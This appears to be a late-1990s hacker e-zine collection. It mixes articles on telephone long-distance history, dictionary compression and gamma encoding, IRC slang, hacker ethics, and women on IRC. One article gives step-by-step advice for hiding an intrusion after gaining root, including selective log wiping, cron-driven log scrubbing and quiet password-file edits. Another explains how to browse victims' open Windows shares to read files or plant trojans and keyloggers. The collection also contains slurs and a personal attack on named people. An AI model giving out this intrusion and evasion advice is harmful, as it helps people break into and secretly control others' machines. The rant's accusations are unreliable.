+ - On getting the computer tone, dial 1234567890 or wahtever 10 digit
+   authorization number is assigned to the organization. 
+
+ - After the computer acknowledges the 10 digit authorization code it will
+   return a dial tone to you.
+
+ - Now dial the 10 digit telephone number of the party you with to speak with
+   Eg. (410)671-8192.
+
+ - Wait for the call to proceed and ring. Hope and pray that the call is
+   answered and the line is not busy and is clear enough to hold a
+   conversation on. Otherwise, start all over from square one.
+
+Users would obviously become very frustrated with this procedure. This is
+especailly true if the called parties were busy or if the user (for instance
+a telemarketing group) needed to make multiple calls. The need to dial 32
+or 33 digits just to get a call through was frustrating. Especially since the
+users did now follow the company guidelines and dialed AT&T directly, they
+only had toi dial 12 digits. This was significant, particularly when there
+were thousands of calls being made per month. The accumulated waste of time
+might have cost the organizations more in productivity losses than MCIs
+service saved them.
+
+So why did MCI require all this digits in the past? The answr is simple. They
+had no choice. When competition first began, AT&T was the owner of the Bell
+system. To preclude the competitive threat, AT&T controlled how the network
+was set up. MCI had to rent telephone li nes from the local Bell telephone
+company. At the central office, these lines were connected from the CO to the
+MCI computer. THe calls was a completed call the minute the computer answered
+the incoming request. MCI did not get any of the information that is passed
+along from CO to CO or from CO to long distance supplier, becuase they were
+on the wrong side of the switching system. They were on the line side, not
+the trunk side. AT&T was on the trunk side of the switch, so call the caller
+ID information was paseed from switch to switch and no extra digits were
+required.
+
+When the Bell system was broken apart from the AT&T network, then equal
+access was allowed. Prior to that, AT&T controlled the network and made sure
+that equal access would not be a reality, or they priced the equal-access
+connectivity so hight that no vendor could afford it.
+
+Now that things are equal in the eyes of carriers such as MCI, Sprint, LDDS
+Worldcom, etc. They can all be connected to the trunk side of the system. Now
+caller ID information, called automatic idenfication of outward dialed or
+automatic number identification (ANI) and many other names is passed on to
+any carrier that is connected to the local or toll switches on the trunk
+side of the network. Calls are passed from switch to switch, routed
+through the network to and end point before termination takes place. The
+world is a better place for this. MCI and its peers are now all able to
+offer the same limited dial sequence that AT&T has always enjoyed. Now
+they get even better access to the systems and are offered services called
+feature groups, allowing for flate rate billing, call screening, and
+multiplexed services on high speed trunks. This makes them as attractive
+as any of the long distance services that they were competing with in the
+past years.
+
+Conclusion:
+----------
+
+This concludes my article. I hope you had fun reading. Cya next time :)
+
+********************************************************************************
+Data Compression ~ virogen
+
+There are two basic types of compression, dictionary and statistical. Dictionary compression relies on the 
+assumption that most data will contain sequences of bytes (hereafter called phrases) that are repeated more 
+than once. Statistical compression calculates the odds of each symbol (such as a byte) and encodes the 
+symbols with the most probability into fewer bits than those with the least probability of occurrence. A hybrid 
+of both dictionary and statistical encoding is often the most optimal approach.
+This article will be an brief introduction to the most popular dictionary algorithms, as well as some optimizing 
+and other techniques. I'll try to make things sound as simple as they really are. BE WARNED that I wrote this 
+article up pretty quickly, and it may contain inaccuracies.. if so, then pat yourself on the back for at least 
+recognizing the inaccuracies<g>. 
+Dictionary Based Compression Algorithms
+=============================
+Lempel and Ziv are the founders of dictionary based compression; most dictionary compression algorithms are 
+derived from their LZ77 or LZ78. Trying not to get into too many details about all variants of LZ77 and LZ78, 
+I will only describe the most commonly used of each class. 
+
+LZSS
+------
+
+LZSS is an LZ77 variant which encodes a phrase that has already occurred once in the source data as an index 
+to that phrase and its length. Bytes which have not already occurred in the source data, or cannot be represented 
+in fewer bits by encoding a codeword (index/length combination), are encoded as literals. Obviously, this requires 
+a control bit to specify whether a literal or index/length combination follows. For example, if we have the following data:
+
+ABCDABCCDAB
+
+LZSS would encode it as follows:
+
+ABCD[4,3][5,4]
+
+The most simple LZSS compressor may use 12bit indexes and 4 bit lengths, allowing for a 4096 byte window and 
+up to 16 byte lengths. Assuming that is the case, the above example would save 18 bits: 
+11*8 = 88 bits
+- (4*8)+(16*2)+6 = 70 bits
+
+Clearly, this is the number of bits in the literals, plus the number of bits in the two codewords, plus the 6 control bits. 
+
+LZW
+----- 
+
+Lempel-Ziv-Welch is an expansion of LZ78, which builds a dictionary during compression and decompression and 
+stores only the entry of the member in that dictionary instead of an index/length pair as LZ77 does. LZW is patented 
+by Unisys and IBM (there was some confusion at the patent office) and is used in GIF compression, unix compress, 
+and v.42bis. The primary advantage of LZW is compression speed over the LZ77 class.
+LZW emits only codewords, it does not emit literals. This means that at the start of compression or decompression, 
+the dictionary must be initialized to the 256 possible bytes. Every time a codeword is emitted, that dictionary item plus 
+the next byte are added to the dictionary. For example:
+
+AABAAC
+
+byte 0 - emit 65
+add AA to dictionary as member 257 
+byte 1 - emit 65
+add AB to dictionary as member 258
+byte 2 - emit 66
+add BA to dictionary as member 259
+byte 3 - emit 257
+add AAC to dictionary as member 260
+byte 5 - emit 67
+
+Yielding:
+[65][65][66][257][67]
+
+The decoder lags one step behind the encoder in building the
+dictionary, storing the previous dictionary item plus the current
+byte as a new dictionary entry. Decoding of the above example would be; 
+codeword 0 65 - emit 'A'
+first item, don't add to dictionary
+codeword 1 65 - emit 'A'
+add AA to dictionary as member 257
+codeword 2 65 - emit 'B'
+add AB to dictionary as member 258
+codeword 4 257 - emit 'AA'
+add BA to dictionary as member 259
+codeword 5 66 - emit 'C'
+add AAC to dictionary as member 260
+
+Once your dictionary becomes full (the size of which is determined
+by the number of bits you chose to represent codewords by), you can quit adding members (freezing the dictionary), 
+throw the entire dictionary out, or rotate out the oldest or least used members. 
+Optimizing Dictionary Based Compression
+--------------------------------------- 
+Speed
+======
+Doing a linear search for phrases in the LZ77 class of compressors is clearly not optimal. The best approach is to 
+store the locations of words in the window in a binary tree or linked list, and traverse the tree or linked list to find 
+the offsets of those words. For example, if you were looking for a 3 byte phrase 'VGE', you may reference the 
+linked list containing the offsets of all occurrences of 'VG' and do a compare at each location. 
+It is also a optimal to have your phrase compare function find the largest match at any given offset. Rather than 
+just say "Yes, I've found a 3 byte match" and then search for 4 byte match, you would want to have your phrase 
+compare function return the size of the largest match at any given position, and then search for that size+1 on the 
+next iteration of the phrase search loop.
+In the LZ78 class, storing hashes of the dictionary members will be much faster than string compares. 
+Size
+=====
+Encoding of codewords into as few bits as possible, yet maintaining a large window or dictionary size is cleary 
+important. If you use static codeword sizes, you want to strike some balance. For example, a 4k window will 
+require 12 bit indexes, while a 64k window will require 16bit indexes. While the 64k window would yield more 
+phrase matches, having to encode the indexes in 16bits will probably yield a worse compression ratio.
+The best solution to this problem is to use a statistical layer, such as huffman to optimally encode the indexes, 
+lengths, and literals. Unfortunately, this adds some degree of complexity to your compressor and decompressor. 
+So, the most viable solution is to use a type of gamma encoding, which is in reality a statistical encoder that makes 
+certain assumptions, such as the smallest integers will be the most common. 
+
+Gamma Encoding
+--------------
+Gamma encoding allows for encoding of integers, with the encoding also relaying the size of the integer. Therefore, 
+gamma encoding removes the dependency on static integer lengths. Gamma encoding should only be applied to 
+symbols where the smallest value is the most common; a good example of which is phrase lengths. 
+Normal Gamma Encoding
+--------------------- 
+Normal gamma encoding involves storing a number of 1 bits equal to the number of bits in the integer, then a 0 bit, 
+then the integer itself. For example 10111b would be encoded 11111010111b. Interleaving the tag bits with the bits 
+of the integer yields easy decoding, which would give us 1101111110b for the above example. As you can see, every 
+other bit acts as a virtual stop/go bit, 1 indicating continue, 0 indicating stop. Now, when we interleave the bits like this, 
+we notice that the first two will always be 1 on integers greater than 1. Therefore, if we assume that we will never 
+need to gamma encode an integer less than 2 (which is usually the smallest phrase length), then we can omit encoding 
+the first bit of the integer, therefore saving two bits for every integer. Examples of this gamma encoding: 
+Normal Gamma Encoding
+0 - 0 = 0b
+1 - 1b = 101b
+2 - 10b = 11010b
+3 - 11b = 11011b
+4 - 100b = 1110100b
+5 - 101b = 1110101b
+6 - 110b = 1110110b
+
+Interleaved Gamma Encoding 
+0 - 0 = 0b
+1 - 1b = 10b
+2 - 10b = 1100b
+3 - 11b = 1110b
+4 - 100b = 110100b
+5 - 101b = 110110b
+6 - 110b = 111100b
+
+Gamma encoding with most significant bit omitted:
+0 - 0b = (cannot be encoded)
+1 - 1b = (cannot be encoded) 
+2 - 10b = 00b
+3 - 11b = 10b
+4 - 100b = 0100b
+5 - 101b = 0110b
+6 - 110b = 1101b
+
+
+Punctured Gamma Encoding
+-----------------------------
+Punctured gamma encoding is optimal in some circumstances. In punctured gamma encoding we encode the integer 
+backwards, storing a stop/go bit after every one bit. Assuming 0 will be the stop bit, and 1 will be the go bit, here is 
+are examples of encoding 1-6:
+
+Punctured Gamma Encoding:
+0 - 0 = (cannot be encoded)
+1 - 1b = 10b
+2 - 10b = 010b
+3 - 11b = 1110b
+4 - 100b = 0010b
+5 - 101b = 11010b
+6 - 110b = 01110b 
+As you can see, the optimality of punctured gamma encoding depends on the number of one bits in the integer. 
+For an integer such as 10000000b, we only need one extra bit to encode it as 000000010b, where-as an integer 
+such as 11111111b will require twice as many bits to encode, 1111111111111110b. 
+Delta Encoding
+--------------
+Delta encoding basically gamma encodes the number of bits in the integer. For example, in normal gamma encoding 
+we would have the following, as stated previously:
+
+0 - 0 = 0b
+1 - 1b = 101b
+2 - 10b = 11010b
+3 - 11b = 11011b
+4 - 100b = 1110100b
+5 - 101b = 1110101b
+6 - 110b = 1110110b
+
+By gamma encoding (using interleaved with high bit omission) the number of bits in the integer as an integer, we 
+would have: 
+0 - 0 = (cannot be encoded)
+1 - 1b = (cannot be encoded)
+2 - 10b = 0010b
+3 - 11b = 1011b
+4 - 100b = 0100100b
+5 - 101b = 0110101b
+6 - 110b = 1101110b 
+Clearly, delta encoding is only optimal where the distribution of integers is larger. For example, compare the 
+interleaved, high-bit omitted gamma with the delta for integer 1111111111111111b (0ffffh):
+
+Gamma: 11111111 11111111 11111111 111110 (30 bits)
+
+16 bits in integer = 10000b = 01010100b
+Delta: 01010100 11111111 11111111 (24 bits)
+[16] [integer] 
+
+Other Tricks
+============
+
+Lazy Evaluation
+---------------
+Lazy evaluation checks to see if there is a better match at the current pointer+1 before it encodes a match at the 
+current pointer. For example, if you were encoding the following: 
+ABDBCDEF ABCDEF
+
+When we reach the second occurrence of 'ABC' we will find a two byte match, however if we skip that match 
+and encode 'A' as a literal then we will find a five byte match 'BCDEF', So the encoding would be A[6,5] with lazy 
+evaluation, and [8,2][6,4] without. Since codewords are usually always longer than literals, the lazy evaluation 
+would save us bits by encoding a single larger phrase and a literal as opposed to two smaller phrases.
+
+Run-Length-Encoding in LZ77 class
+---------------------------------
+A nice advantage of the LZ77 class of compressors is that RLE can be built into the compressor and decompressor 
+without any changes other than allowing the phrase compare during the phrase search to extend past the current 
+pointer. For example, if we have the following run:
+offset 01234567
+byte 00000000
+
+We would first encode literal 0, then as we are searching for a matching phrase for the second 0, we would find 
+the first 0. Allowing the compare to extend past the current pointer of 1, we would find that there is a 7 byte match 
+at index 1. So, we would simply encode 0[1,7]. During decompression, we would just start copying at index 1 and 
+as we are copying we would be copying the next byte to be copied<g>. What I mean to say is that a simple, 'rep 
+movsb' would work as it would in any normal phrase.
+
+Conclusion
+==========
+Well, maybe this not-so-well-written article has at least peaked your curiosity about data compression. A fair 
+warning though, it's takes a hell of alot of work to beat compression software already available; indeed, I seemed 
+to have forfeited my own life in the data compression quest.
+
+Credits
+========
+Johnny Panic and Jibz helped me alot while I was developing JCALG1, it is to them I owe most of my knowledge 
+of compression.
+
+
+Jeremy (collake@charter.net )
+
+********************************************************************************
+IRC Crap hehe by awnix
+
+if you say this crap in a 'proper' channel you get beaten up.
+
+a/s/l?   - age / sex / location? 
+         - The utmost lamest thing you can say, if you don't count 
+	 - <{DJ}mAdKiNg> ah aM 3l3eT pH34r!@#$
+
+sup/wassup ?  - translation - Greetings! I am a paedophillic warez pup wigger!
+
+< numbers, alternate casing,
+  and excessive punctuation> - ie. y0 n33g4z w4dduP 1n d4 gH3t70?!?!@#$ 
+                             - I will physically kick your ass if you do. 
+ 			    
+< acting like a 'badass    
+  mutha fucken n33gr0!#$'  > - You are obviously are very deprived little 
+                             - little boy, that sits inside all day d/loading
+			           - warez and pornography, and nuking decent people
+			           - I will come around to your house and kick you
+			           - in the pre-pubescent nads. St00p1d b1aTcH!@#$.
+QUOTE OF THE... ISSUE:
+<Guest2362> I have been on irc for many years but now there is this new hacker out 
+there called nickserv and everytime I connect he changes my nick. Can anyone help? 			     
+
+Thankyou. Thankyou very much. 
+
+*************************************************************************************
+-=[ sneaking around ]=-
+by: max
+july 99
+
+NOTE: this article requires at least a substantial amount of knowledge and experience 
+with the general unix operating system. if the reader currently doesn't have these 
+prerequisites, he/she shouldn't be reading this article.
+
+the purpose of this particular article is to inform others about the various methods 
+and techniques for keeping yourself safe from administrator detection in an array of 
+systems. furthermore, i do not encourage network intrusions or web defacements. do so 
+at your own risk. (not to be hypocritical, but i'm not denying the fact that i've never 
+done the aforementioned actions).
+
+with that said, let's begin. first of all, whatever you do, no matter how much you yearn 
+to brag and boast of your elite hacking accomplishments, never speak of your dirty deeds 
+to anyone, anywhere. there are many different reasons for not doing so, but your major 
+concern is the chance of there being an informant for a federal agency, etc. remember, 
+you can never be too paranoid. that is one of my golden rules.
+
+ok, before you even get root access for the box, you need to take some preliminary 
+precautions. when probing and scanning the box, you should be using an external and 
+separate shell, and if possible, another one (or multiple) on top of the first. the 
+reasons for doing this should be self-evident and obvious, but if not, i shall explain. 
+it will be much more difficult and time-consuming to trace the hacker in question if 
+the previous precautions are taken. the reason being is that if the admin(s) somehow 
+find the hostname and/or ip address from the first box you were using, if you were 
+using multiple shells, he/she would have to untangle a huge web of systems, regions 
+and accounts. i do not recommend using a wingate as opposed to a shell, because you 
+never know who is watching over it, and chances are it's like a cheap skanky whore 
+(it's been used quite a few times by others. heh.).
+
+now let's assume you've taken complete control of the particular box in question. what 
+do you do now? well, our first task at hand is to wipe clean all of the lines regarding 
+our little stunt from all of the relevant logs. as we all should know by now, on most 
+unix boxen, the directory that logs get stored in are under the /var/* hierarchy. for 
+example, the three main directories should be: /var/log, /var/adm, and sometimes 
+/var/audit. but, if possible, try very hard not to completely remove the log files 
+contained in those directories. if you do that, it will be very obvious to the admin(s) 
+that there has been a network intrusion. just in case you accidentally 'rm' the directories 
+or log files, what you should do is recreate the old files with the same name, permissions, 
+owner, and group of the previous logs/directories, using the commands: 'mkdir', 'chmod', 
+'chown', 'chgrp', respectively. in addition, if possible, try not to make a whole new 
+password file. instead, just add or modify certain entries to your liking. this reduces 
+the chances of the admin(s) becoming aware of the security breach.
+
+what i also recommend you doing is creating a shell script, perl script or cron entry 
+that wipes out only the lines of your escapades and nothing else, in the previously 
+mentioned log files at specified intervals of time. you can accomplish this by writing 
+a perl script which uses the 'grep' command (or another similar function) with your ip 
+address or hostname as the argument. of course, there's more to it than that, but i'm 
+not going to delve into the specifics of the script. when that is finished, just add a 
+cron entry which executes your script every so often. this is perfect for the lazy 
+hacker/intruder and reduces the amount of keystrokes and time necessary for editing 
+the logs. make sure, just in case, to set protective permissions on these 
+scripts/entries/etc., because you don't want anyone else to be able to discover 
+your means of stealth and cunning.
+
+finally, never stray from these tips and rules. try very hard not to become lazy and 
+slack off. if this occurs too many times, you'll be seeing more of that suspicious black 
+van across the street. until next time.. trust no one..
+
+***************************************************************************************
+=[ Experts or Fakes? ]=
+
+Disclaimer Towards This Article
+
+     Anything said below should not be twisted around.  Whatever was said below 
+was found on the public internet and if you attempt to do your normal thing and 
+sue for someone making fun of you, well, get your facts straight, because this 
+article isn't about making fun of you.  This article is expressing the opinion 
+from a real Network Security Consultant, not a make-believe one with only media
+skill.  Anything you dislike in this article is what you call an "opinion" and 
+as citizen of the United States i have the right to "Freedom of Speech", have 
+you ever heard of that?  Nothing below is meant to hurt your character, but it 
+is meant to put a damper in your opinions towards other people if you are mentioned 
+in this article.  Don't take anything i say below WAY too seriously or out of hand, 
+because i would appreciate if you researched what is said below and show fact for 
+fact that most of this article will not be assumptions, it will be stated of true 
+BOLD printed facts.  I could care less if you hold me responsible for this article, 
+because i have a right to post it and i have the right to speak upon what i believe 
+in.  Below you will understand what is going on in my head and you will most likely 
+believe the exact same ethics and thoughts about these people the same way i do.
+
+     As time goes on in the life of an internet junkie in which you may be or even a 
+well organized businessman, if you read about the underground scene, hacking scene, 
+network security scene or anything related then you might have heard of some of these 
+names in which are mentioned in here.  Let me get off my chest first that these are 
+my opinions based on facts found on the internet and that i am not attempting to 
+destroy anyone's character, because if you stay on the same track as this article goes 
+by, then you will see that these people make their own character look rather non-
+professional or in simple terms "plain stupid".  I have never seen anyone to my 
+knowledge of 19 years attempt to sue so many people in my life over illegitimate 
+mishaps.  We present you John Vranesevich who at the time i got raided, posted that 
+i was arrested and got bailed out by my family.  If i was the "professional" like 
+John Vranesevich i would have sued him for slander and other time consuming ways 
+to get back at him, but instead of doing something that would have downgraded myself 
+to his level, i simply called him and asked him what this article was about and why 
+he was posting false information about me.  He told me via the telephone that he got 
+this information from a, and i quote "reliable source" when i asked about it.  Great 
+reliable sources you got there guy, who didn't even get 1 bit of information correct, 
+besides the fact that i was raided.  This tends to happen often with John since his 
+reliable sources were at that time, internet kids, who could possibly come up with 
+any story in which they wish and this time, they did and he posted it.  He told me 
+he would replace and take it down, but he wouldn't let me know who his source is, 
+which in my opinion, he had none.  (Notice: These following words are opinions 
+expressed, not to hurt character)  I figured he had no better story and since at 
+that time my group (gH) was pretty much all over the media for compromising and defacing 
+www.whitehouse.gov, so he wanted in on the action because not many people in my 
+group liked him and would give a story that he wanted, so he made one up, go figure.  
+(End of opinion)  Nevertheless, i moved on with my life, but has John, not in my eyes.  
+After getting raided a story was done about me and my group on the front page of the 
+USA TODAY saying that John is "trusted by outlaw elements of the hacker comunity" 
+which i would like to state my opinion on how a person like me can trust someone who 
+has turned his back on something that makes his business run.  "Hackers" make the 
+internet go round and round, not John the so called "cyberspace expert" who to my 
+knowledge, correct me if i'm wrong, hired others to secure his network.  Enough about 
+him, so for more information simply scroll down and some provided links will happily 
+inform you more on this expert in the shadows of hackers.
+
+     We all want to be someone special when we grow up and make a difference, for 
+instance another known "security expert" calling herself the "granny hacker", which 
+in my opinion is more like a non-professional media specialist.  So much can be said 
+about Carolyn Meinel who runs happyhacker.org which if you are like and have ever 
+accessed it, you could see how non-organized this place is.  In all do respect, 
+security is the greatest thing to the internet, but the skill is to secure your 
+network or workstation as much as possible to your full capabilities and still allow 
+your users to get the full capability of the operating system at hand.  These machines 
+aren't secure, they are completely revamped to not let the user do anything whatsoever,
+which makes it almost imposible to gain root access.  Is this how security is supposed
+to be done by a "security expert"?  I would have to say NO!  I would never attempt 
+to limit needed access to programs most used by users to simply prove i'm a security 
+expert.  I do network security every single day and have NEVER done anything like 
+this before.  Also, in some articles she has called hacking "easy", which in due time 
+could be to the greatest of all people, but to a simple user, not a chance.  Maybe 
+she is referring to a script kid of some sort who can run automated programs written 
+by other people to gain root on a machine, but if you want to get to the technical 
+basis of being a "hacker" you must not only know unix, but how everything works, 
+such as routing, tcp/ip, programming and the full capabilities of your skills at 
+hand. Also, i noticed many articles written by her concentrating on how to hack legitly 
+in windows?  What she has expressed is not the type of stuff i would consider as 
+"hacking", but since she is the expert, we must all listen to her, correct? No, 
+like i am doing right now, we must stand for ourself in our own scene in which we 
+created, not people like who attempt to be a living stereotype of the "hacker" 
+ethics that we created.  I also noticed a link on her site to governmental webpages, 
+(Note: These following words are opinions expressed, not facts) yet i see it as a 
+doorway to any "hacker" to visit her site to attempt to break into government sites 
+or give them an idea, but that might not be her main purpose.  One thing i can relate 
+to is how she commented about a group of people ratting out my group and how she 
+discussed my group being raided was an event of a group of my friends being rats.  
+She knows nothing on my group, has never talked with anyone in my group and we will 
+never stoop to her level to even discuss security related issues with her type of 
+incompatence and that is a fact.  I see nothing but windows commands run in a dos 
+prompt and nothing unix based coming out of her articles and that is a bad vision 
+on how everything is really done.  Last, but definately not least is her articles 
+and how they are professional written in ircish talk, using !@#@!# and smily faces 
+such as :) and characters like that even in her interviews with newspapers to express 
+herself.  I honestly must say in all due respect, this gives our community a bad name, 
+making us look like our scene is revolved around internet relay chat, which it is not.  
+I see no expressions written here like that and you won't, because i don't live, 
+sleep and think irc, unlike her, i am a security consultant and deal with proffesionalism.  Below are links about Carolyn Meinel as well.
+
+     This is where my opinions come in about these 2 individuals and it is like i said my 
+right to have a freedom of speech.  One shut down packet storm and one gets kicked out of 
+defcon, what kind of people are we dealing with that the world calls experts?  In my 
+vision i see 2 kids with big names and no knowledge whatsoever and if it came down to it, 
+i would challenge either one of them to a debate of knowledge or skill in any security 
+related issue.  I and noone in this zine are afraid of either of these individuals nor 
+will i or anyone else stand for this type of disrespect to a world of great minds put 
+together that we created to sit and watch it get destroyed by the enemy.  Packet storm was 
+respected by numorous corporations around the world, helped admins around the world and 
+got alot of people great respect for their programming skill, something the other individuals 
+named here have none of, so i stand to state that if they want to fight what we created, 
+we should fight for what we beleive in.  Sueing someone or attempting to sue someone over 
+petty things is not on my list, i have the knowledge to fight with my mind and ethics on 
+the situation at hand and i need no legal upholders to support my battle, i am myself as 
+well as you are yourself.  Me as well as you probably as well do security or whatever you 
+do for the fun and not to get a big name to use it against other people to shut them down,
+because they are a threat to your corporation.  
+
+The moral of this whole section would be:
+
+"Battle with knowledge and love for the sport, not with money and publicity you made from 
+the sport."
+
+[John Vranesevich]
+http://www.attrition.org/netgation
+
+[Carolyn Meinel]
+http://www.antionline.com/cgi-bin/News?type=antionline&date=07-19-1999&story=CMDC2.news 
+(She talked about my group!)
+http://netsecurity.about.com/library/weekly/aa052598.htm?pid=2822&cob=home
+http://www.antionline.com/features/quick_tips/
+http://www.pc-radio.com/pcworld/meinel.html
+http://www.happyhacker.org
+
+
+     I would like to thank l0pht & cDc for proving a monopoly means nothing and is a 
+great example of my moral which is stated above, all my gH members, attrition.org, the 
+associated press, my family for supporting me everyday of my life, adam at posix.net for 
+hosting pure-security.net for me and last but not least the government for raiding me, 
+which finally pointed me in the right direction to help networks around the world.
+
+                                    mosthated of gH
+                                 most@pure-security.net
+                              http://www.pure-security.net/
+*****************************************************************************************
+Hello, my name is Jen. I decided to write an article on the role that
+females play on irc, and the overall personna that is created based solely
+on their gender. The basis for this article was made on assumptions created
+by a survey taken, questioning close to 30 active irc users. Most questioned
+were people of #b4b0, or friends of mine (see list of nicks below).  The
+questions i asked, consisted mainly of "what do you think of females on
+irc", and to the girls, i asked mainly "do you feel as though you're treated
+differently, for the sole reason of being female". The feedback I received,
+varied a little, but the overall conclusion resulted in, 'yes, females are
+treated differently'.  Although, the ways that the females were
+differentiated, varied from guys either being harsh or overly nice. Their
+intensions were also questioned in the survey, and I'd have to say that
+overall the guys with which we associate are warm-hearted and sincere, but
+occasionally lacking entertainment or suffering from boredom.
+
+I wasn't surprised to find that a lot of the guys question the authenticity
+of the information that a girl offers (eg. pictures, personal information,
+sexual oriented information, gender, etc.) Not many of the guys made a
+decision that just because a girl is on irc, means that she is either
+lifeless or unworthy. However, there was a comment made, that basically
+noted "the reason for a girl to be on irc is to get attention, so she will
+do whatever is asked of her, including cybersex or phonesex, to accomplish a
+sort of acceptance, or acknowledgement".
+
+Girls be proud of these guys though, and appreciate the hard work and effort
+of their endeavors, because they're willing to share their knowledge and
+teach you. All of the guys in the survey denied that they would not coach or
+teach someone just because they are female. There is no reason why we
+shouldn't have interest in what the guys are passionate about, or what they
+excel in, if we're going to spend so much time with them, or in their
+presence. I would also guess that, we might be respected more, if we did
+make at least the effort to learn about the things that they participate in.
+
+I asked the girls if they were upset or frustrated by the expectations made
+by guys online. The comparisons, expectations, standards, we all know these
+obstacles can at times be upsetting or disppointing. After surveying the
+girls, i was surprised to find that most of them didn't really care what the
+guys thought about them. Seeming pretty confident (unfortunately, i am
+lacking in this attribute, so my perspective is different from some of the
+girls), a lot of them seemed to make the decision that, if they're not seen
+as being good enough, than the person judging was obviously the inferriorone.
+
+The basic conclusion, and request from this article, comes down to,
+appreciate and respect each other equally. Be there for people, for the
+reason of making a difference, not for the expectation of receiving some
+kind of "favor" in return. Don't make assumptions about someone, nor create
+pretenses to be appreciated. If you have to have a nude picture with a
+saying "bozo owns me" accross your chest, than obviously there is lack for
+respect, acknowledgement, and appreciation for the person you are, and for
+your expression. It's commonly said that you can't really know someone from
+irc on a personal level, but i disagree. Intimacy and friendship is very
+apparent online. Appreciate the people that you spend hours with, without
+being so harsh and insulting without reason.
+
+Oh, last thing...everyone denies their cybering experience, so why do us
+girls recieve constant requests? ;P 
+
+Special thanks to everyone that participated in the survey, and especially to b4b0.  
+(tip, tgb, dono, pr0phet, polder, jsbach, mosthated, angieb, mynd, icesk, misfit, 
+eckis, kyle, borgie, justin, n0k1a, KKR, schemerz, sistym, opcode, ch1ckie, r1ngy,
+hitman, mya)
+
+~lusta
+************************************************************************************
+Our roots and our rights. 
+
+As I started this article, I was attempting to do a piece on ethical 
+hacking, I got way up on my soap box and started whaling away at the 
+keys. While writing I decided I wanted to cite Steven Levy’s "Hackers" 
+as a source to prove my point.. I started re-reading it, for probably 
+the tenth time, but the first in 3 or 4 years.. what I realized as I 
+read the first few chapters smacked me in the face and reminded me why 
+I’m here, and what this is all about. 
+
+As "Hackers" we from the very beginning have faced people and forces 
+that, for whatever reasons, would rather we use machines the way they 
+want us to, and not the way we deem fit. And, although I still find 
+some web page defacing and the like to be a bad idea, and the wrong 
+way to go about things, I am now completely reminded of the frustration 
+that brings us to these ends. 
+
+At our culture’s humble beginnings, we were faced with administration 
+that wanted to keep our kind as far away from the actual machines as 
+possible ("Hackers" - Steven Levy, Chapter 1, ‘Tech Model Railroad 
+Club’ ), what spawned out of their unrelenting efforts to touch and 
+feel was the very first interactive programming, something everyone 
+takes for granted today. This is one of many examples of how we as the 
+digital underground forge new ground, take things to the next level, 
+and create magic. Many, many ideas were born out of these simple 
+quests to do something ‘more’ with the machines around us. In fact, 
+the browser you use to view this zine began life as one of those odd 
+little ideas that struck someone one day, and grew to become popular 
+culture, and something we take for granted everyday. 
+
+It appears another revolution is at hand, forces stacking stores of 
+offensive armament on each side, each prepared to fight for what they 
+see as the proper future of the online world. We all have our ways to 
+further our side of this cause, whether they be brut force, as some of 
+the more publicized efforts of late have been, or through more 
+conventional, political means of motivation. The one thing that is 
+crystal clear to me is that, we all must do our parts and do them well 
+in order for our voices to be heard in the proper perspective by an all 
+to often under educated and fear mongering public. 
+
+Get out there, campaign for elected officials that support free-speech 
+online, loosened encryption laws, and free dissemination of information. 
+When you hear someone telling the facts wrong, do your best to make sure 
+they are corrected and, corrected in a manner that makes us look good 
+not ways that make us into villains and bandits in this new frontier. 
+Radicals and free thinkers founded this country and, in my humble hacker 
+opinion, it’s about time that we, as the free-thinkers of our 
+generation, take back what was once such a great foundation. 
+
+Blackice blackice@anti-social.com 
+http://www.mi6-general.com/ 
+
+*************************************************************************************
+WARNING: This article may contain, but not endorse spelling errors, dirty 
+language, extreme stupidity, maliciousness, shoplifting and rude behavior. 
+Please do not take it seriously or use it as toilet paper. 
+
+
+Vulnerabilities in Win95/98 and NT boxes. 
+By, colevert 
+
+I wrote this article at two in the morning, so don't expect to much from it. 
+=] 
+
+
+Win boxes were never really known for there security over networks actually 
+they were never known for security at all really. I mean when was the last 
+time you heard a sysadmin say 'Damn if only we were running windows we could 
+have avoided that hack' since infact anyone can basically open one up like 
+can of worms without the owner knowing, or not knowing enough to care. There 
+are simple things the owner of the machine can over look. Simple they may 
+be, but useful to someone who knows how to exploit these simple little 
+things. 
+
+The one such thing I'm writing about here is quite simple. It's allowing 
+your computer to access shared files/folders/drives/printers on another 
+win95 box over a network. Doesnt sound like much, but it can be quite 
+useful. For example, you can install their printer on your computer and 
+print out cute little messages on their end. EX: 'I can see you', or such 
+classic's as 'OWNED' or that over-do term paper you never printed out 
+becouse, hey you don't have a printer. The more useful things you can do 
+with to a shared computer is look at files. You know find those silly little 
+black mail things no one was supposed to see.. just use your imagination.. 
+Anyway enough about what you can do, heres how to set up your box so you can 
+do it. A lot of you may or may not already know about this, those who do are 
+probably making joyous fun of my skillz. =] 
+
+I've never tried setting this up on a Win98 machine but I'm sure it's not 
+much different. 
+
+
+Setting it up 
+------------------ 
+For this to work you must have Winsock 2.2 installed, if you do not, you can 
+find the upgrades just about anywhere. Microsoft.com should have them. 
+
+Click on Control Panel. Then Double Click on Network. 
+If you do not have 'Client for Microsoft Networks' listed under the 
+installed components box, click on add. If it is listed skip the rest of the 
+setup process. 
+After choosing add the type of network component you will select is Client. 
+>From the manufactures list you will choose Microsoft (hey what did you 
+expect). The type of client you will choose is Client for Microsoft 
+Networks. Click on ok. You may need your windows install disk. 
+
+Reboot. 
+
+That was simple huh? 
+
+
+Use 
+------------------ 
+
+To use this all you need is the victom machines IP address. Keep in mind 
+that not all win boxes are Vulnerable only ones that have sharing enabled. I 
+have found that many people do have much shared. It's a great way to get 
+mp3's, pron or even stuff you have no business having. Just pop in on the 
+drives and have a look see. It can be useful (considering you have write 
+access to the drive) when planting a Trojan or keylogger. 
+
+to use simply type \\ipaddress in your run box. 
+
+Now that you are ready to rock you can check to see if you computer is 
+Vulnerable to these type of low budget hacks. 
+
+Go to he run box and type \\youripaddress 
+If a box pops up that says something to the effect of Network Name Can not 
+be found, you are not Vulnerable. If a Folder pops up with drive listings 
+you are Vulnerable. 
+
+The only tough part about this is finding machines that have full sharing on 
+them. You can try incorporating this into an irc script that will try an IP 
+address when you click on it, or a whole bunch of IP addresses. I know there 
+are some scripts or add-ons out there already that do this. 
+
+If you cant find any victoms, you can always make some. Well considering you 
+have local access to the computer you want to attack. Just open it up to 
+share everything. This can be useful when working on networks and needing to 
+copy large files from one machine to another. 
+
+
+-colevert 
+
+*****************************************************************************
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++                             chrak's MySQL Intro                              +
++                                                                              +
++                                   Part I                                     +
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
